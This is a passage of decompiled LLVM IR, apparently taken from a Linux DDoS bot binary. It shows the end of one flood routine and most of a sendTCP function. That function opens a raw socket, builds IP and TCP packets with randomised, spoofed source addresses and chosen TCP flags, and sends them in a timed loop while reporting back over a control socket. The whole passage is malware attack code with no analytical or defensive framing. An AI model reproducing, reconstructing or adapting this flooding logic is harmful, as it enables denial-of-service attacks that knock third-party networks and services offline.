  %v6_804de41 = call i32 @__libc_sendto(i32 %stack_var_-80.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804de41, i32* %eax.global-to-local, align 4
  %v1_804de49 = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  %sext3 = mul i32 %v1_804de49, 65536
  %v1_804de4e = sdiv i32 %sext3, 65536
  store i32 %v1_804de4e, i32* %edx.global-to-local, align 4
  store i32 %v1_804dd2b, i32* %eax.global-to-local, align 4
  %v1_804de53 = trunc i32 %v1_804de4e to i16
  store i16 %v1_804de53, i16* %v5_804dd2e, align 4
  br i1 %v1_804da7a, label %dec_label_pc_804de67, label %dec_label_pc_804de5c

dec_label_pc_804de5c:                             ; preds = %dec_label_pc_804de2c
  %v1_804de5c = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  br label %dec_label_pc_804de7f

dec_label_pc_804de67:                             ; preds = %dec_label_pc_804de2c
  store i32 %v1_804de6a.pre-phi, i32* %eax.global-to-local, align 4
  %v0_804de6f = load i32, i32* @esp, align 4
  %v2_804de72 = add i32 %v0_804de6f, -16
  %v3_804de72 = inttoptr i32 %v2_804de72 to i32*
  store i32 %v1_804de6a.pre-phi, i32* %v3_804de72, align 4
  %v1_804de73 = sext i16 %stack_var_-102.0 to i32
  %v2_804de73 = call i32 @htons(i32 %v1_804de73)
  br label %dec_label_pc_804de7f

dec_label_pc_804de7f:                             ; preds = %dec_label_pc_804de5c, %dec_label_pc_804de67
  %storemerge.in = phi i32 [ %v1_804de5c, %dec_label_pc_804de5c ], [ %v2_804de73, %dec_label_pc_804de67 ]
  %storemerge = trunc i32 %storemerge.in to i16
  store i32 %v1_804dd2b, i32* %eax.global-to-local, align 4
  %v4_804de82 = urem i32 %storemerge.in, 65536
  %v5_804de82 = load i32, i32* %edx.global-to-local, align 4
  %v6_804de82 = and i32 %v5_804de82, -65536
  %v7_804de82 = or i32 %v6_804de82, %v4_804de82
  store i32 %v7_804de82, i32* %edx.global-to-local, align 4
  store i16 %storemerge, i16* %v4_804ddc5, align 2
  %sext13 = mul i32 %storemerge.in, 65536
  %v1_804de8a = sdiv i32 %sext13, 65536
  %v2_804de8a = call i32 @rand_cmwc(i32 %v1_804de8a)
  %sext4 = mul i32 %v2_804de8a, 65536
  %v1_804de8f = sdiv i32 %sext4, 65536
  store i32 %v1_804de8f, i32* %edx.global-to-local, align 4
  store i32 %v2_804dd13, i32* %eax.global-to-local, align 4
  %v1_804de94 = trunc i32 %v1_804de8f to i16
  store i16 %v1_804de94, i16* %v4_804de94, align 4
  %v0_804de98 = load i32, i32* @esp, align 4
  %v5_804de9b = add i32 %v0_804de98, -16
  %v6_804de9b = inttoptr i32 %v5_804de9b to i32*
  store i32 %storemerge6, i32* %v6_804de9b, align 4
  %v3_804de9e = call i32 @GetRandomIP(i32 %v1_804de8a, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804de9e, i32* %eax.global-to-local, align 4
  %v0_804dea3 = load i32, i32* @esp, align 4
  %v3_804dea9 = inttoptr i32 %v0_804dea3 to i32*
  store i32 %v3_804de9e, i32* %v3_804dea9, align 4
  %v0_804deaa = call i32 @htonl()
  store i32 %v0_804deaa, i32* %edx.global-to-local, align 4
  store i32 %v0_804deaa, i32* %v3_804deb7, align 4
  store i32 %v2_804dd13, i32* %eax.global-to-local, align 4
  %v3_804debd = load i16, i16* %v2_804dde7, align 2
  %v4_804debd = zext i16 %v3_804debd to i32
  store i32 %v4_804debd, i32* %edx.global-to-local, align 4
  store i32 %v2_804dd13, i32* %eax.global-to-local, align 4
  %v1_804decc = load i32, i32* @esp, align 4
  %v2_804decc = add i32 %v1_804decc, -4
  %v3_804decc = inttoptr i32 %v2_804decc to i32*
  store i32 %v4_804debd, i32* %v3_804decc, align 4
  %v0_804decd = load i32, i32* %eax.global-to-local, align 4
  %v2_804decd = add i32 %v1_804decc, -8
  %v3_804decd = inttoptr i32 %v2_804decd to i32*
  store i32 %v0_804decd, i32* %v3_804decd, align 4
  %v3_804dece = inttoptr i32 %v1_804de8a to i16*
  %v4_804dece = call i32 @csum(i16* %v3_804dece, i32 ptrtoint (i32* @0 to i32))
  %v5_804dece = trunc i32 %v4_804dece to i16
  %sext16 = mul i32 %v4_804dece, 65536
  %v1_804ded6 = sdiv i32 %sext16, 65536
  store i32 %v1_804ded6, i32* %edx.global-to-local, align 4
  store i16 %v5_804dece, i16* %v4_804de05, align 2
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v15_804dee2 = icmp eq i32 %stack_var_-84.0, %arg6
  %v1_804dee5 = icmp eq i1 %v15_804dee2, false
  br i1 %v1_804dee5, label %dec_label_pc_804df05, label %dec_label_pc_804dee7

dec_label_pc_804dee7:                             ; preds = %dec_label_pc_804de7f
  %v0_804dee7 = load i32, i32* @esp, align 4
  %v1_804deea = add i32 %v0_804dee7, -16
  %v2_804deea = inttoptr i32 %v1_804deea to i32*
  store i32 0, i32* %v2_804deea, align 4
  %v2_804deec = inttoptr i32 %v1_804de8a to i32*
  %v3_804deec = call i32 @__GI_time(i32* %v2_804deec)
  store i32 %v3_804deec, i32* %eax.global-to-local, align 4
  %v0_804def1 = load i32, i32* @esp, align 4
  %v1_804def1 = add i32 %v0_804def1, 16
  %v8_804def7 = icmp sgt i32 %v3_804deec, %v5_804de16
  br i1 %v8_804def7, label %dec_label_pc_804df4f, label %dec_label_pc_804de2c

dec_label_pc_804df05:                             ; preds = %dec_label_pc_804de7f
  %v4_804df05 = add i32 %stack_var_-84.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804df0b = icmp eq i32 %stack_var_-80.0.ph, %arg7
  %v1_804df0e = icmp eq i1 %v15_804df0b, false
  br i1 %v1_804df0e, label %dec_label_pc_804df47, label %dec_label_pc_804df10

dec_label_pc_804df10:                             ; preds = %dec_label_pc_804df05
  store i32 %v1_804df23, i32* %edx.global-to-local, align 4
  store i32 %v2_804df2c, i32* %eax.global-to-local, align 4
  %v0_804df2f = load i32, i32* @esp, align 4
  %v2_804df32 = add i32 %v0_804df2f, -16
  %v3_804df32 = inttoptr i32 %v2_804df32 to i32*
  store i32 %v2_804df2c, i32* %v3_804df32, align 4
  %v1_804df33 = sext i32 %v4_804df05 to i64
  %v2_804df33 = call i32 @usleep(i64 %v1_804df33)
  store i32 %v2_804df33, i32* %eax.global-to-local, align 4
  %v0_804df38 = load i32, i32* @esp, align 4
  %v1_804df38 = add i32 %v0_804df38, 16
  br label %dec_label_pc_804de2c.outer

dec_label_pc_804df47:                             ; preds = %dec_label_pc_804df05
  %v4_804df47 = add i32 %stack_var_-80.0.ph, 1
  %v0_804de32.pre.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804de2c.outer

dec_label_pc_804df4f:                             ; preds = %dec_label_pc_804dee7, %dec_label_pc_804dc6e, %dec_label_pc_804dc30
  %v0_804df5833 = phi i32 [ %v3_804dc7c, %dec_label_pc_804dc6e ], [ %v3_804dc3e, %dec_label_pc_804dc30 ], [ %v3_804deec, %dec_label_pc_804dee7 ]
  br label %dec_label_pc_804df52

dec_label_pc_804df52:                             ; preds = %dec_label_pc_804dba8, %dec_label_pc_804db14, %dec_label_pc_804da9f, %dec_label_pc_804daf9, %dec_label_pc_804df4f
  %v0_804df58 = phi i32 [ 0, %dec_label_pc_804db14 ], [ %v4_804daac, %dec_label_pc_804da9f ], [ %v3_804db07, %dec_label_pc_804daf9 ], [ %v0_804df5833, %dec_label_pc_804df4f ], [ %v2_804dbad, %dec_label_pc_804dba8 ]
  store i32 %v0_804da6c, i32* @ebx, align 4
  ret i32 %v0_804df58

; uselistorder directives
  uselistorder i32 %v4_804df05, { 2, 1, 0 }
  uselistorder i32 %v0_804deaa, { 1, 0 }
  uselistorder i32 %v1_804de8f, { 1, 0 }
  uselistorder i32 %v1_804de8a, { 3, 2, 1, 0 }
  uselistorder i16 %storemerge, { 3, 1, 0, 2 }
  uselistorder i32 %v1_804de4e, { 1, 0 }
  uselistorder i32 %v0_804de32, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-80.0.ph, { 3, 0, 4, 2, 1 }
  uselistorder i32 %v0_804dde1, { 1, 0 }
  uselistorder i32 %v4_804ddc2, { 3, 2, 1, 0 }
  uselistorder i32 %v1_804de6a.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804ddaa, { 2, 1, 0 }
  uselistorder i32 %v1_804dd8e, { 1, 0 }
  uselistorder i32 %v1_804dd6f, { 1, 0 }
  uselistorder i32 %v2_804dd13, { 9, 8, 7, 6, 17, 16, 15, 5, 4, 14, 3, 13, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v2_804dce9, { 1, 0 }
  uselistorder i32 %v4_804dc1f, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v4_804dbc7, { 1, 0 }
  uselistorder i32 %stack_var_-88.0.ph, { 1, 0 }
  uselistorder i32 %v2_804dbee, { 1, 0 }
  uselistorder i32 %v1_804db1c, { 4, 3, 1, 2, 0, 5 }
  uselistorder i32 %v1_804db17, { 2, 1, 0, 3 }
  uselistorder i32 %v4_804dae8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804daa2, { 2, 3, 0, 1 }
  uselistorder i32 %v1_804da8a, { 1, 0 }
  uselistorder i32 %v12_804da6d, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 %arg7, { 0, 3, 1, 2 }
  uselistorder i32 %arg6, { 0, 3, 1, 2, 4 }
  uselistorder i32 %arg5, { 7, 6, 5, 4, 0, 3, 1, 2 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804df52, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804de7f, { 1, 0 }
  uselistorder label %dec_label_pc_804de2c, { 1, 0 }
  uselistorder label %dec_label_pc_804de2c.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ddbf, { 1, 0 }
  uselistorder label %dec_label_pc_804dcf0, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_804dc92, { 1, 0 }
  uselistorder label %dec_label_pc_804dba8, { 1, 0 }
  uselistorder label %dec_label_pc_804db74, { 1, 0 }
  uselistorder label %dec_label_pc_804db74.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804da9f, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp47 = call i16 @__decompiler_undefined_function_5()
  %tmp48 = call i32 @__decompiler_undefined_function_0()
  %tmp49 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %v0_804df5d = load i32, i32* @esi, align 4
  %v0_804df5e = load i32, i32* @ebx, align 4
  %v15_804df5f = ptrtoint i32* %stack_var_-172 to i32
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804df76 = icmp eq i32 %arg2, 0
  %v1_804df7a = icmp eq i1 %v4_804df76, false
  br i1 %v1_804df7a, label %dec_label_pc_804df87, label %dec_label_pc_804df7c

dec_label_pc_804df7c:                             ; preds = %entry
  %v1_804df7c = call i32 @rand_cmwc(i32 %v15_804df5f)
  store i32 %v1_804df7c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804df9f

dec_label_pc_804df87:                             ; preds = %entry
  %v1_804df8a = urem i32 %arg2, 65536
  store i32 %v1_804df8a, i32* %eax.global-to-local, align 4
  %v5_804df8f = icmp ult i32* %stack_var_-172, inttoptr (i32 12 to i32*)
  store i1 %v5_804df8f, i1* %cf.global-to-local, align 1
  %v1_804df93 = call i32 @htons(i32 %v1_804df8a)
  store i32 %v1_804df93, i32* %eax.global-to-local, align 4
  %v0_804df98 = load i32, i32* @esp, align 4
  %v2_804df98 = icmp ugt i32 %v0_804df98, -17
  store i1 %v2_804df98, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804df9f

dec_label_pc_804df9f:                             ; preds = %dec_label_pc_804df7c, %dec_label_pc_804df87
  %v2_804dfa2 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804dfa5 = icmp eq i32* %stack_var_-60, inttoptr (i32 -4 to i32*)
  store i1 %v5_804dfa5, i1* %cf.global-to-local, align 1
  %v15_804dfa5 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v15_804dfa5, i32* %eax.global-to-local, align 4
  %v4_804dfac = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v4_804dfac, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804dfb4 = icmp eq i32 %v4_804dfac, 0
  br i1 %v1_804dfb4, label %dec_label_pc_804dfbd, label %dec_label_pc_804e4e0

dec_label_pc_804dfbd:                             ; preds = %dec_label_pc_804df9f
  %v15_804dfc0 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v15_804dfc0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v5_804dfd0 = icmp ult i32* %stack_var_-172, inttoptr (i32 4 to i32*)
  store i1 %v5_804dfd0, i1* %cf.global-to-local, align 1
  %v4_804dfd9 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v4_804dfd9, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804dfe4 = icmp eq i32 %v4_804dfd9, 0
  %v1_804dfe8 = icmp eq i1 %v4_804dfe4, false
  br i1 %v1_804dfe8, label %dec_label_pc_804e005, label %dec_label_pc_804dfea

dec_label_pc_804dfea:                             ; preds = %dec_label_pc_804dfbd
  %v0_804dfea = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804dfea, i32* %eax.global-to-local, align 4
  %v5_804dfef = icmp ult i32* %stack_var_-172, inttoptr (i32 8 to i32*)
  store i1 %v5_804dfef, i1* %cf.global-to-local, align 1
  %v3_804dff8 = call i32 @sockprintf(i32 %v0_804dfea, i32 ptrtoint ([27 x i8]* @global_var_8058730.300 to i32))
  store i32 %v3_804dff8, i32* %eax.global-to-local, align 4
  %v0_804dffd = load i32, i32* @esp, align 4
  %v2_804dffd = icmp ugt i32 %v0_804dffd, -17
  store i1 %v2_804dffd, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804e4e0

dec_label_pc_804e005:                             ; preds = %dec_label_pc_804dfbd
  store i32 1, i32* %stack_var_-64, align 4
  %v5_804e00c = icmp ult i32* %stack_var_-172, inttoptr (i32 12 to i32*)
  store i1 %v5_804e00c, i1* %cf.global-to-local, align 1
  %v2_804e011 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_804e011, i32* %eax.global-to-local, align 4
  %v5_804e01c = call i32 @__GI_setsockopt(i32 %v4_804dfd9, i32 0, i32 3, i32 %v2_804e011, i32 4)
  store i32 %v5_804e01c, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804e024 = icmp slt i32 %v5_804e01c, 0
  %v1_804e026 = icmp eq i1 %v2_804e024, false
  br i1 %v1_804e026, label %dec_label_pc_804e043, label %dec_label_pc_804e028

dec_label_pc_804e028:                             ; preds = %dec_label_pc_804e005
  %v0_804e028 = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804e028, i32* %eax.global-to-local, align 4
  %v5_804e02d = icmp ult i32* %stack_var_-172, inttoptr (i32 8 to i32*)
  store i1 %v5_804e02d, i1* %cf.global-to-local, align 1
  %v3_804e036 = call i32 @sockprintf(i32 %v0_804e028, i32 ptrtoint ([33 x i8]* @global_var_805874c.301 to i32))
  store i32 %v3_804e036, i32* %eax.global-to-local, align 4
  %v0_804e03b = load i32, i32* @esp, align 4
  %v2_804e03b = icmp ugt i32 %v0_804e03b, -17
  store i1 %v2_804e03b, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804e4e0

dec_label_pc_804e043:                             ; preds = %dec_label_pc_804e005
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e043 = icmp eq i32 %arg4, 0
  %v1_804e047 = icmp eq i1 %v4_804e043, false
  br i1 %v1_804e047, label %dec_label_pc_804e052, label %dec_label_pc_804e068

dec_label_pc_804e052:                             ; preds = %dec_label_pc_804e043
  %v5_804e059 = sub i32 32, %arg4
  %v10_804e059 = icmp ugt i32 %arg4, 32
  store i1 %v10_804e059, i1* %cf.global-to-local, align 1
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804e061 = urem i32 %v5_804e059, 32
  %v4_804e061 = icmp eq i32 %v2_804e061, 0
  br i1 %v4_804e061, label %bb102, label %bb

bb:                                               ; preds = %dec_label_pc_804e052
  %v5_804e061 = shl i32 1, %v2_804e061
  store i32 %v5_804e061, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %bb102

bb102:                                            ; preds = %dec_label_pc_804e052, %bb
  %v0_804e063 = phi i32 [ 1, %dec_label_pc_804e052 ], [ %v5_804e061, %bb ]
  %v1_804e063 = sub i32 0, %v0_804e063
  store i1 true, i1* %cf.global-to-local, align 1
  store i32 %v1_804e063, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e068

dec_label_pc_804e068:                             ; preds = %dec_label_pc_804e043, %bb102
  %storemerge12 = phi i32 [ %v1_804e063, %bb102 ], [ 0, %dec_label_pc_804e043 ]
  %v1_804e06b = add i32 %arg6, 40
  %v1_804e077 = add i32 %arg6, 70
  %v2_804e07a = and i32 %v1_804e077, -16
  %v2_804e080 = sub i32 %v15_804df5f, %v2_804e07a
  %v1_804e088 = add i32 %v2_804e080, 15
  %v2_804e08b = and i32 %v1_804e088, -16
  store i32 %v2_804e08b, i32* %edx.global-to-local, align 4
  %v1_804e0a3 = add i32 %v2_804e08b, 20
  %v5_804e0a6 = inttoptr i32 %v1_804e0a3 to i16*
  %v1_804e0ac = add i32 %arg6, 20
  store i32 %v1_804e0ac, i32* %eax.global-to-local, align 4
  store i32 %v1_804e0ac, i32* @ebx, align 4
  %v5_804e0b1 = icmp ult i32 %v2_804e080, 12
  store i1 %v5_804e0b1, i1* %cf.global-to-local, align 1
  %v5_804e0b4 = add i32 %v2_804e080, -16
  %v6_804e0b4 = inttoptr i32 %v5_804e0b4 to i32*
  store i32 %storemerge12, i32* %v6_804e0b4, align 4
  %v2_804e0b7 = call i32 @GetRandomIP(i32 %v1_804e06b, i32 %v2_804e08b)
  store i32 %v2_804e0b7, i32* %eax.global-to-local, align 4
  %v0_804e0bc = load i32, i32* @esp, align 4
  %v1_804e0bc = add i32 %v0_804e0bc, 16
  %v5_804e0bf = icmp ult i32 %v1_804e0bc, 12
  store i1 %v5_804e0bf, i1* %cf.global-to-local, align 1
  %v3_804e0c2 = inttoptr i32 %v0_804e0bc to i32*
  store i32 %v2_804e0b7, i32* %v3_804e0c2, align 4
  %v0_804e0c3 = call i32 @htonl()
  store i32 %v0_804e0c3, i32* %eax.global-to-local, align 4
  %v0_804e0c8 = load i32, i32* @esp, align 4
  %v3_804e0cb = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_804e0cb, i32* %edx.global-to-local, align 4
  %tmp105 = and i32 %v0_804e0c8, -4
  %v5_804e0ce = icmp eq i32 %tmp105, -16
  store i1 %v5_804e0ce, i1* %cf.global-to-local, align 1
  %v0_804e0d1 = load i32, i32* @ebx, align 4
  %v2_804e0d1 = add i32 %v0_804e0c8, 8
  %v3_804e0d1 = inttoptr i32 %v2_804e0d1 to i32*
  store i32 %v0_804e0d1, i32* %v3_804e0d1, align 4
  %v1_804e0d2 = add i32 %v0_804e0c8, 4
  %v2_804e0d2 = inttoptr i32 %v1_804e0d2 to i32*
  store i32 6, i32* %v2_804e0d2, align 4
  %v3_804e0d4 = inttoptr i32 %v0_804e0c8 to i32*
  store i32 %v0_804e0c3, i32* %v3_804e0d4, align 4
  %v0_804e0d5 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e0d5 = add i32 %v0_804e0c8, -4
  %v3_804e0d5 = inttoptr i32 %v2_804e0d5 to i32*
  store i32 %v0_804e0d5, i32* %v3_804e0d5, align 4
  %v5_804e0d6 = add i32 %v0_804e0c8, -8
  %v6_804e0d6 = inttoptr i32 %v5_804e0d6 to i32*
  store i32 %v2_804e08b, i32* %v6_804e0d6, align 4
  %v0_804e0d9 = call i32 @makeIPPacket()
  store i32 %v0_804e0d9, i32* %eax.global-to-local, align 4
  %v0_804e0de = load i32, i32* @esp, align 4
  %v5_804e0de = icmp ugt i32 %v0_804e0de, -25
  store i1 %v5_804e0de, i1* %cf.global-to-local, align 1
  %v2_804e0e1 = call i32 @rand_cmwc(i32 %v1_804e0a3)
  %sext = mul i32 %v2_804e0e1, 65536
  %v1_804e0e6 = sdiv i32 %sext, 65536
  store i32 %v1_804e0e6, i32* %edx.global-to-local, align 4
  store i32 %v1_804e0a3, i32* %eax.global-to-local, align 4
  %v1_804e0eb = trunc i32 %v1_804e0e6 to i16
  store i16 %v1_804e0eb, i16* %v5_804e0a6, align 4
  %v2_804e0ee = call i32 @rand_cmwc(i32 %v1_804e0a3)
  %v2_804e0f8 = add i32 %v2_804e08b, 24
  %v3_804e0f8 = inttoptr i32 %v2_804e0f8 to i32*
  store i32 %v2_804e0ee, i32* %v3_804e0f8, align 8
  store i32 %v1_804e0a3, i32* %eax.global-to-local, align 4
  %v1_804e0fe = add i32 %v2_804e08b, 28
  %v2_804e0fe = inttoptr i32 %v1_804e0fe to i32*
  store i32 0, i32* %v2_804e0fe, align 4
  store i32 %v1_804e0a3, i32* %edx.global-to-local, align 4
  %v1_804e108 = add i32 %v2_804e08b, 32
  %v2_804e108 = inttoptr i32 %v1_804e108 to i8*
  %v3_804e108 = load i8, i8* %v2_804e108, align 16
  %v1_804e10b = urem i8 %v3_804e108, 16
  %v1_804e10e = or i8 %v1_804e10b, 80
  store i1 false, i1* %cf.global-to-local, align 1
  store i8 %v1_804e10e, i8* %v2_804e108, align 16
  %v4_804e114 = ptrtoint i8* %arg5 to i32
  store i32 %v4_804e114, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e114, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805876d.302 to i32), i32* @edi, align 4
  %v6_804e132 = call i32 @_strncmp(i8* %arg5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805876d.302, i32 0, i32 0), i32 4)
  %v7_804e132 = urem i32 %v6_804e132, 2
  %v8_804e132 = icmp eq i32 %v7_804e132, 0
  %v0_804e134 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e134 = or i1 %v0_804e134, %v8_804e132
  %v3_804e134 = zext i1 %v2_804e134 to i32
  %v4_804e134 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e134 = and i32 %v4_804e134, -256
  %v6_804e134 = or i32 %v3_804e134, %v5_804e134
  %v7_804e134 = xor i32 %v6_804e134, 1
  store i32 %v7_804e134, i32* @edx, align 4
  %v3_804e13a = and i32 %v6_804e132, -256
  %v1_804e13c = trunc i32 %v7_804e134 to i8
  %v3_804e13c = zext i1 %v0_804e134 to i8
  %v4_804e13c = sub nsw i8 %v1_804e13c, %v3_804e13c
  %v15_804e13c = icmp eq i8 %v4_804e13c, 0
  %v20_804e13c = zext i8 %v4_804e13c to i32
  %v23_804e13c = or i32 %v20_804e13c, %v3_804e13a
  store i32 %v23_804e13c, i32* @ecx, align 4
  %v2_804e140 = sext i8 %v4_804e13c to i32
  store i32 %v2_804e140, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e145 = icmp eq i1 %v15_804e13c, false
  br i1 %v1_804e145, label %dec_label_pc_804e188, label %dec_label_pc_804e147

dec_label_pc_804e147:                             ; preds = %dec_label_pc_804e068
  store i32 %v1_804e0a3, i32* %edx.global-to-local, align 4
  %v1_804e14a = add i32 %v2_804e08b, 33
  %v2_804e14a = inttoptr i32 %v1_804e14a to i8*
  %v3_804e14a = load i8, i8* %v2_804e14a, align 1
  %v4_804e14a = zext i8 %v3_804e14a to i32
  %v6_804e14a = and i32 %v2_804e140, -256
  %v7_804e14a = or i32 %v6_804e14a, %v4_804e14a
  %v1_804e14d = or i32 %v7_804e14a, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e14d = trunc i32 %v1_804e14d to i8
  store i32 %v1_804e14d, i32* %eax.global-to-local, align 4
  store i8 %v3_804e14d, i8* %v2_804e14a, align 1
  store i32 %v1_804e0a3, i32* %edx.global-to-local, align 4
  %v3_804e156 = load i8, i8* %v2_804e14a, align 1
  %v4_804e156 = zext i8 %v3_804e156 to i32
  %v5_804e156 = load i32, i32* %eax.global-to-local, align 4
  %v6_804e156 = and i32 %v5_804e156, -256
  %v7_804e156 = or i32 %v4_804e156, %v6_804e156
  %v1_804e159 = or i32 %v7_804e156, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e159 = trunc i32 %v1_804e159 to i8
  store i32 %v1_804e159, i32* %eax.global-to-local, align 4
  store i8 %v3_804e159, i8* %v2_804e14a, align 1
  store i32 %v1_804e0a3, i32* %edx.global-to-local, align 4
  %v3_804e162 = load i8, i8* %v2_804e14a, align 1
  %v4_804e162 = zext i8 %v3_804e162 to i32
  %v5_804e162 = load i32, i32* %eax.global-to-local, align 4
  %v6_804e162 = and i32 %v5_804e162, -256
  %v7_804e162 = or i32 %v4_804e162, %v6_804e162
  %v1_804e165 = or i32 %v7_804e162, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e165 = trunc i32 %v1_804e165 to i8
  store i32 %v1_804e165, i32* %eax.global-to-local, align 4
  store i8 %v3_804e165, i8* %v2_804e14a, align 1
  store i32 %v1_804e0a3, i32* %edx.global-to-local, align 4
  %v3_804e16e = load i8, i8* %v2_804e14a, align 1
  %v4_804e16e = zext i8 %v3_804e16e to i32
  %v5_804e16e = load i32, i32* %eax.global-to-local, align 4
  %v6_804e16e = and i32 %v5_804e16e, -256
  %v7_804e16e = or i32 %v4_804e16e, %v6_804e16e
  %v1_804e171 = or i32 %v7_804e16e, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e171 = trunc i32 %v1_804e171 to i8
  store i32 %v1_804e171, i32* %eax.global-to-local, align 4
  store i8 %v3_804e171, i8* %v2_804e14a, align 1
  store i32 %v1_804e0a3, i32* %edx.global-to-local, align 4
  %v3_804e17a = load i8, i8* %v2_804e14a, align 1
  %v4_804e17a = zext i8 %v3_804e17a to i32
  %v5_804e17a = load i32, i32* %eax.global-to-local, align 4
  %v6_804e17a = and i32 %v5_804e17a, -256
  %v7_804e17a = or i32 %v4_804e17a, %v6_804e17a
  %v1_804e17d = or i32 %v7_804e17a, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e17d = trunc i32 %v1_804e17d to i8
  store i32 %v1_804e17d, i32* %eax.global-to-local, align 4
  store i8 %v3_804e17d, i8* %v2_804e14a, align 1
  %v0_804e354.pre = load i8*, i8** %stack_var_-20, align 4
  br label %dec_label_pc_804e354

dec_label_pc_804e188:                             ; preds = %dec_label_pc_804e068
  store i32 %v4_804e114, i32* @eax, align 4
  %v0_804e18b = load i32, i32* @esp, align 4
  %v5_804e18b = icmp ult i32 %v0_804e18b, 8
  store i1 %v5_804e18b, i1* %cf.global-to-local, align 1
  %v1_804e18e = add i32 %v0_804e18b, -12
  %v2_804e18e = inttoptr i32 %v1_804e18e to i32*
  store i32 ptrtoint (i32* @global_var_8058771.303 to i32), i32* %v2_804e18e, align 4
  %v0_804e193 = load i32, i32* @eax, align 4
  %v2_804e193 = add i32 %v0_804e18b, -16
  %v3_804e193 = inttoptr i32 %v2_804e193 to i32*
  store i32 %v0_804e193, i32* %v3_804e193, align 4
  %v3_804e194 = call i32 @__GI_strtok(i32 4, i32 ptrtoint ([4 x i8]* @global_var_805876d.302 to i32))
  store i32 %v3_804e194, i32* %eax.global-to-local, align 4
  %v5_804e19c = inttoptr i32 %v3_804e194 to i8*
  store i8* %v5_804e19c, i8** %stack_var_-20, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804e34a21 = icmp eq i32 %v3_804e194, 0
  %v1_804e34e28 = icmp eq i1 %v5_804e34a21, false
  br i1 %v1_804e34e28, label %dec_label_pc_804e1a4.lr.ph, label %dec_label_pc_804e354

dec_label_pc_804e1a4.lr.ph:                       ; preds = %dec_label_pc_804e188
  %v1_804e311 = add i32 %v2_804e08b, 33
  %v2_804e311 = inttoptr i32 %v1_804e311 to i8*
  %tmp103 = bitcast i8** %stack_var_-20 to i32*
  br label %dec_label_pc_804e1a4

dec_label_pc_804e1a4:                             ; preds = %dec_label_pc_804e1a4.lr.ph, %dec_label_pc_804e335
